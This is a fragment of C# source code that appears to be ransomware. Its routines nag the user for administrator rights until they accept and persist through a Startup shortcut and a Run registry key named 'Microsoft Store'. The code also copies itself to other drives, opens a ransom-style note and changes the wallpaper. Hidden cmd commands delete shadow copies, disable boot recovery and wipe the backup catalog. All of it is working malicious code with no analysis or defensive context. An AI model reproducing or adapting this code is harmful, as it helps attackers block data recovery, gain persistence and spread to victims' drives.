	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
